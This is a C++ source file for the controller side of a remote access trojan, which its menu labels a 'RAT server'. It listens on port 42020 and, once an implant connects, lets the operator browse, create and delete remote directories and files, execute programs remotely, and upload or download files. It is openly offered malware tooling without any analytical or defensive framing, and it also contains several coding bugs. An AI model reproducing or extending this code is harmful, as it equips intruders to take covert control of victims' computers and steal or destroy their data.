#undef UNICODE
#define WIN32_LEAN_AND_MEAN


#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>



#pragma warning(disable:4996) //For allowing the compilation because the "fopen" method is considered "unsafe".

using namespace std;

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib,"AdvApi32.lib")

#define BUFFLEN_CONTROL_MESSAGE 4
#define BUFFLEN_SHORT_MESSAGE 256
#define BUFFLEN_LONG_MESSAGE 10000
#define BUFLEN_FILE 1000000
#define RAT_PORT "42020"


string getCD()
{
	char* cd = _getcwd(0, 0);
	string cdString = cd;
	return cdString;
}

int InitializeWinsock(WSADATA &wsaData)
{

	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);

	return result;

}

bool CheckIResultError(int result)
{

	bool error = false;

	if (result != 0)
	{

		error = true;

	}
	else
	{

		error = false;

	}

	return error;

}

bool SendShortMessage(SOCKET &socket, string shortMessage)
{

	int iResult;
	int shortMessageSize = (int)strlen(shortMessage.c_str());
	bool sentSuccessfully=true;

	//Sending the short message
	iResult = send(socket, shortMessage.c_str(), (shortMessageSize + 1), 0);

	if (iResult == SOCKET_ERROR)
	{

		cout << "send failed with error: " << WSAGetLastError() << "\n";

		sentSuccessfully = false;

	}


	return sentSuccessfully;

}



string RecvShortMessage(SOCKET &socket)
{

	bool done = false;
	int cumul = 0;
	int iResult;
	char shortMessageBuf[BUFFLEN_SHORT_MESSAGE];
	string shortMessage = "";

	while (!done)//Checking that the received message is containing all the characters.
	{

		//To receive the message
		iResult = recv(socket, &shortMessageBuf[0], BUFFLEN_SHORT_MESSAGE, 0);
		if (iResult == SOCKET_ERROR)
		{

			cout << "recv failed with error: " << WSAGetLastError() << "\n";//recv error

			closesocket(socket);

			WSACleanup();

			return shortMessage;

		}
		else
			if (iResult>0)
			{

				for (int i = cumul; i < (cumul + iResult); i++)
				{

					if (shortMessageBuf[i] == '\0')//the message was completly received 
					{

						done = true;

						for (int x = 0; x < i; x++)//copy the message in the buff into the string
						{

							shortMessage += shortMessageBuf[x];

						}

						i = (cumul + iResult);

					}

				}

			}
			else
			{

				done = true;
				int i = 0;

				while (shortMessageBuf[i] != 'Ì')
				{

					shortMessage += shortMessageBuf[i];

					i++;

				}

			}

		cumul = iResult;

	}

	return shortMessage;

}

string RecvLongMessage(SOCKET &socket)
{

	bool done = false;
	int cumul = 0;
	int iResult;
	char longMessageBuf[BUFFLEN_LONG_MESSAGE];
	string longMessage = "";

	while (!done)//Checking that the received message is containing all the characters.
	{

		//To receive the message
		iResult = recv(socket, &longMessageBuf[0], BUFFLEN_LONG_MESSAGE, 0);
		if (iResult == SOCKET_ERROR)
		{

			cout << "recv failed with error: " << WSAGetLastError() << "\n";//recv error

			closesocket(socket);

			WSACleanup();

			return longMessage;

		}
		else
			if (iResult>0)
			{

				for (int i = cumul; i < (cumul + iResult); i++)
				{

					if (longMessageBuf[i] == '\0')//the message was completly received 
					{

						done = true;

						for (int x = 0; x < i; x++)//copy the message in the buff into the string
						{

							longMessage += longMessageBuf[x];

						}

						i = (cumul + iResult);

					}

				}

			}
			else
			{

				done = true;
				int i = 0;

				while (longMessageBuf[i] != 'Ì')
				{

					longMessage += longMessageBuf[i];

					i++;

				}

			}

		cumul = iResult;

	}

	return longMessage;

}
int SendFile(SOCKET &socket, string fileName)//return 0 if ran successfully. Otherwise, it returns 1 for error management.
{

	int iResult;
	FILE* file;
	file= fopen(fileName.c_str(), "rb");
	//To check if the file exist.
	if (file != NULL)
	{

		//Send a to message to the server to let it know that the client is trying to send a non-existent file.
		if (SendShortMessage(socket, "0") == false)
		{
			fclose(file);//close the file

			return 1;

		}

		//Get the file size
		fseek(file, 0, SEEK_END);
		int fileSize = ftell(file);
		rewind(file);

		string serverAnswer = "";//0 if received, not received if it's another value
		serverAnswer = RecvShortMessage(socket);// Receives a message from to the server juste to alternate send and receive...


		//Send the file's name
		if ((SendShortMessage(socket, fileName)) == false)//failed to send the file's name to the server
		{
			cout << "An error occured while sending the name of the file to the server" << endl;
			fclose(file);//close the file

			return 1;
		}

		//Confirmation of reception
		if ((serverAnswer = RecvShortMessage(socket)) != "0")
		{
			fclose(file);//close the file

			return 1;//doesn't receive the message or a reception error

		}


		string fileSizeString = to_string(fileSize);//put the file's size in a c++ string

		if ((SendShortMessage(socket, fileSizeString)) == false)//If failed to send the size of the file
		{

			fclose(file);//close the file

			return 1;

		}

		if ((serverAnswer = RecvShortMessage(socket)) != "0")
		{

			cout << "An error occured while sending the file's size to the server" << "\n";

			fclose(file);//close the file

			return 1;

		}

		
		char *fileBuf = (char*)malloc(sizeof(char) * fileSize);//Allocate a memory block of the file's size to the pointer.
		if (fileBuf == NULL)
		{

			cout << "Program's buffer memory allocation failed." << endl;

			fclose(file);//close the file

			SendShortMessage(socket, "1");

			return 1;

		}



		SendShortMessage(socket, "0");




		serverAnswer = RecvShortMessage(socket);//to avoid that two messages can end up in the buffer, the client receive a useless message here just for avoiding to send two times in a row.

		size_t size;
		size = fread(fileBuf, 1, fileSize, file);
		if (size != fileSize) //Check if there is no reading error.
		{
			cout << "File reading failed" << endl;
			fclose(file);//close the file

			SendShortMessage(socket, "1");//error message for the server

			return 1;
		}

		SendShortMessage(socket, "0");

		if ((serverAnswer = RecvShortMessage(socket)) != "0")//Reception of the confirmation of reception of the confirmation of the read status (of the file to send) confirmation.
		{
			fclose(file);//close the file

			return 1;

		}

		
		//To send the file
		iResult = send(socket, fileBuf, fileSize, 0);
		if (iResult == SOCKET_ERROR)
		{

			cout << "Send program failed with error: " << WSAGetLastError() << endl;
			fclose(file);//close the file


			return 1;

		}

		cout << "Program sent successfully." << endl;




	}
	else
	{

		cout << "Unable to open the file" << "\n";
		SendShortMessage(socket, "1");
		fclose(file);//close the file

		return 1;

	}

	cout << RecvShortMessage(socket) << endl;
	fclose(file);//close the file

	return 0;

}

int RecvFile(SOCKET &socket)
{
	string fileSize;
	string fileName;
	string error;
	string something;//just for alternate send and receive


	if ((error = RecvShortMessage(socket)) != "0")
	{
		return 1; //client unable to open the file or error
	}

	SendShortMessage(socket, "0");


	if (((fileName = RecvShortMessage(socket)) == ""))//Receive the name of the file
	{
		return 1; //error occured in RecvShortMessage

	}

	if (SendShortMessage(socket, "0") != true)//confirmation of reception
	{
		return 1;//send error
	}

	if (((fileSize = RecvShortMessage(socket)) == ""))//If doesn't receive the size of the file
	{
		return 1; //error occured in RecvShortMessage

	}

	if (SendShortMessage(socket, "0") != true)//Send confirmation of reception
	{
		return 1;//send error
	}


	if ((RecvShortMessage(socket)) != "0")//Receive confirmation of file's memory buffer allocation
	{
		return 1;
	}

	//Send someting
	SendShortMessage(socket, "0");

	if ((RecvShortMessage(socket)) != "0")//Receive status of the reading of the file.
	{
		return 1;
	}

	SendShortMessage(socket, "0");// confirmation of reception


	bool done = false;
	int cumul = 0;
	int iResult;
	char fileBuf[BUFLEN_FILE];

	//To receive the content of the file
	while (!done)
	{

		iResult = recv(socket, fileBuf, BUFLEN_FILE, 0);// not the number of bytes to be received !!!

		cumul += iResult;

		if (iResult == SOCKET_ERROR)
		{


			return(1);
		}

		if (cumul == stoi(fileSize))
		{

			done = true;




		}
		else
		{

			if ((iResult > 0) && (cumul < stoi(fileSize)))//The client has not receive yet all the data 
			{


			}
			else //if the client doesnt receive the right number of bytes
			{

				return 1;
			}

		}

	}

	//Write the file's content on the disk
	FILE* file;
	file = fopen((getCD() + "\\" + fileName).c_str(), "wb");
	fwrite(fileBuf, sizeof(char), stoi(fileSize), file);
	fclose(file);

	SendShortMessage(socket, "0");
    cout<<RecvShortMessage(socket)<<endl;

	cout << fileName << " was received and written successfully on the current directory of the disk" << endl;

	

	return 0;

}

void LocalChdir( string chdirParameter) // to select the right directory to select the files to send and/or to select the right place to write the received files from the server
{

	if (_chdir(chdirParameter.c_str()) == 0)
	{
		cout << ("Current directory on YOUR MACHINE: " + getCD()) << endl;;
	}
	else
		if ((_chdir(chdirParameter.c_str())) == ENOENT)
		{
			cout<<"Directory not found on YOUR MACHINE";
		}
		else
			if ((_chdir(chdirParameter.c_str())) == EINVAL)
			{
				cout<< "Invalid buffer"<<endl;
			}
			else
			{
				cout<< "An unknowm error occured"<<endl;
			}


}

bool Dir(SOCKET &socket)
{
	SendShortMessage(socket, "0");
	
	string result = "";
	result=RecvLongMessage(socket);

	if (result == "")
	{

		cout << "An error occured while running Dir" << "\n";

		return false;

	}
	else
	{

		cout << result << endl;

		return true;

	}

	

}

bool Chdir(SOCKET &socket,string chdirParameter)
{

	string result="";

	SendShortMessage(socket, chdirParameter);

	result = RecvShortMessage(socket);

	if (result == "")
	{

		cout << "An error occured while running Chdir" << "\n";

		return false;

	}
	else
	{

		cout << result << endl;

		return true;

	}


}

bool Mkdir(SOCKET &socket,string folderName)
{
	string result = "";

	SendShortMessage(socket, folderName);

	result = RecvShortMessage(socket);

	if (result == "")
	{

		cout << "An error occured while running Mkdir" << "\n";

		return false;

	}
	else
	{

		cout << result << endl;

		return true;

	}

}

bool Rmdir(SOCKET &socket,string folderName)
{

	string result = "";

	SendShortMessage(socket, folderName);

	result = RecvShortMessage(socket);

	if (result == "")
	{

		cout << "An error occured while running Rmdir" << "\n";

		return false;

	}
	else
	{

		cout << result << endl;

		return true;

	}
	
}

bool Del(SOCKET &socket,string fileName)//fileName with file extension
{
	string result = "";

	SendShortMessage(socket, fileName);

	result = RecvShortMessage(socket);

	if (result == "")
	{

		cout << "An error occured while running Del" << "\n";

		return false;

	}
	else
	{

		cout << result << endl;

		return true;

	}
}

//Create a txt test file for testing the delete functionnality 
bool CreateTestFile(SOCKET &socket,string fileName)//file name without file extension
{

	string result = "";

	SendShortMessage(socket, fileName);

	result = RecvShortMessage(socket);

	if (result != "0")
	{

		cout << "An error occured while running CreateTestFile" << "\n";

		return false;

	}
	else
	{

		cout << "File created" << "\n";

		return true;

	}

}

bool Start(SOCKET &socket,string fileName)//name of the file with the file extension
{
	string result = "";

	SendShortMessage(socket, fileName);

	result = RecvShortMessage(socket);

	if (result != "0")
	{

		cout << "An error occured while running Start" << "\n";

		return false;

	}
	else
	{

		cout << "Program started" << "\n";

		return true;

	}

}


void MenuDisplay()
{
	cout << endl << "Choose an operation to execute on the RAT server: " << endl;
	cout << "\t0-  dir" << endl;
	cout << "\t1-  chdir (on the server)" << endl;
	cout << "\t2-  mkdir" << endl;
	cout << "\t3-  rmdir" << endl;
	cout << "\t4-  del" << endl;
	cout << "\t5-  start" << endl;
	cout << "\t6-  Create a text file" << endl;
	cout << "\t7-  Send a file" << endl;
	cout << "\t8-  Receive a file" << endl;
	cout << "\t9-  Logout" << endl;
	cout << "\t10- chdir on your local machine" << endl<<endl;
	cout << "Enter your choice: ";
}

bool ControlPannel(SOCKET &socket)
{
	int choice;
	bool quit = false;

	MenuDisplay();

	cin >> choice;
	cout << endl;

	while (!cin)//To be sure that user won't right char or invalid value
	{
		cout << endl << "\a\tInvalid value! Please insert a valid value." << endl;
		cin.clear();
		cin.ignore(10000, '\n');
		cout << "\n\n";
		MenuDisplay();
		cin >> choice;

	}

		switch (choice)//Each case put the number of the case at the front of the string parameter to send to the server for allowing him to know wich case executes.
		{
		case 0://Dir
		{


			if (Dir(socket) == false)
			{
				quit = true;
			}
			
			break;
		}

		case 1: //Chdir
		{
			string chdirParameter;
			cout << "Please enter the parameter required for the chdir command: ";
			cin >> chdirParameter;
			cout << endl;
			chdirParameter = "1" + chdirParameter;

			
			if (Chdir(socket, chdirParameter) == false)
			{
				quit = true;
			}
			break;
		}

		case 2: //Mkdir
		{
			string directory;
			cout << "Please enter the name of the new directory: ";
			cin >> directory;
			cout << endl;

			directory = "2" + directory;
			
			if (Mkdir(socket, directory)== false)
			{
				quit = true;
			}
			break;
		}

		case 3: //Rmdir
		{
			string directory;
			cout << "Please enter the name of the directory to remove: ";
			cin >> directory;
			cout << endl;

			directory = "3" + directory;

			

			if (Rmdir(socket,directory)== false)
			{
				quit = true;
			}

			break;
		}

		case 4: //Del
		{
			string fileName;
			cout << "Please enter the name of the file to delete (with the file extension): ";
			cin >> fileName;
			cout << endl;

			fileName = "4" + fileName;

			if (Del(socket,fileName)== false)
			{
				quit = true;
			}

			
			break;
		}

		case 5: //Start
		{
			string fileName;
			cout << "Please enter the name of the file to execute (with the file extension): ";
			cin >> fileName;
			cout << endl;

			fileName = "5" + fileName;

			if (Start(socket,fileName)== false)
			{
				quit = true;
			}

			
			break;

		}

		case 6: //Create txt file for testing delete
		{
			string fileName;
			cout << "Please enter the name of the new txt file (without the extension): ";
			cin >> fileName;
			cout << endl;

			fileName = "6" + fileName;

			if (CreateTestFile(socket,fileName)== false)
			{
				quit = true;
			}
			
			break;
		}

		case 7: //Send a file
		{
			string fileName;
			cout << "Please enter the name of the file (with the extension): ";
			cin >> fileName;
			cout << endl;
			
			SendShortMessage(socket, "7");

			if (SendFile(socket, fileName) != 0)
			{
				quit = true;
			}
			break;
		}

		case 8://Receive a file
		{

			string fileName;
			cout << "Please enter the name of the file (with the extension): ";
			cin >> fileName;
			cout << endl;



			SendShortMessage(socket, ("8"+fileName));

			if (RecvFile(socket) != 0)
			{
				quit = true;
			}
			break;

		}


		case 9:
		{
			quit = true;
			SendShortMessage(socket, "9");

			break;
		}

		case 10:
		{
			string chdirParameter;
			cout << "Please enter the paramter required for the chdir command: ";
			cin >> chdirParameter;
			cout << endl;

			LocalChdir(chdirParameter);

		}

		default:
		{
			break;//if not the value of a case
		}
		}
	





	return (quit);

}

void main()
{

	WSADATA wsaData; // WSA stands for "Windows Socket API"
	int iResult;
	bool iResultError;
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ServerSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, hints;

	iResult = InitializeWinsock(wsaData);

	if ((iResultError = CheckIResultError(iResult)) == true)
	{

		cout << "WSAStartup failed with error: " << iResult << "\n";
		
		return;
	
	}
	else
	{
		
		cout << "WSAStartup ran successfully" << "\n";
	
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;  // Address Format Internet
	hints.ai_socktype = SOCK_STREAM;  //  Provides sequenced, reliable, two-way, connection-based byte streams
	hints.ai_protocol = IPPROTO_TCP;  // Indicates that we will use TCP
	hints.ai_flags = AI_PASSIVE;  // Indicates that the socket will be passive => suitable for bind()

								  // Resolve the server address and port
								  //       => defines port number and gets local IP address (in "result" struct)
	iResult = getaddrinfo(NULL, RAT_PORT, &hints, &result);
	if (iResult != 0) 
	{

		cout << "getaddrinfo failed with error: " << iResult << endl; //getaddrinfo error.

		WSACleanup();
		
		return;

	}
	else
	{

		cout << "getaddrinfo ran successfully." << endl; //getaddrinfo ran successfuly
	
	}

	// Create a SOCKET to accept the connection with the server
	//     (note that we could have defined the 3 socket parameter using "hints"...)
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) 
	{

		cout << "socket failed with error: " << WSAGetLastError() << endl; //Socket error.
		
		freeaddrinfo(result);
		
		WSACleanup();
		
		return;
	
	}
	else
	{
	
		cout << "socket ran successfully." << endl; //Socket is ok.
	
	}

	// Setup the TCP listening socket
	//     (for "bind()", we need the info returned by "getaddrinfo()")
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);// Note:  "ai_addr" is a struct containing IP address and port
	if (iResult == SOCKET_ERROR) 
	{

		cout << "bind failed with error: " << WSAGetLastError() << endl; //Bind error
		
		freeaddrinfo(result);
		
		closesocket(ListenSocket);
		
		WSACleanup();
		
		return;
	
	}
	else
	{
	
		cout << "bind ran successfully." << endl; //Bind is ok
	
	}

	freeaddrinfo(result);

	// define the maximum number of connections
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) 
	{
		
		cout << "listen failed with error: " << WSAGetLastError() << endl; //Listen error
		
		closesocket(ListenSocket);
		
		WSACleanup();
		
		return;
	
	}
	else
	{
	
		cout << "listening..." << endl; //Listen is ok
	
	}

	// Accept a client socket
	//   Notes:
	//          1- "accept()" is a blocking function
	//          2- It returns a new socket of the connection
	ServerSocket = accept(ListenSocket, NULL, NULL);
	if (ServerSocket == INVALID_SOCKET) 
	{

		cout << "accept failed with error: " << WSAGetLastError() << endl; //Accept failed.
		
		closesocket(ListenSocket);
		
		WSACleanup();
		
		return;
	
	}
	else
	{
	
		cout << "accept ran successfully." << endl << "The client is connected to server." << endl; //Accept is ok.
		
		
		
		bool quit = false;

		while (quit == false)
		{
			quit=ControlPannel(ServerSocket);
		}


		closesocket(ServerSocket);

		WSACleanup();


	}

	

	return;

}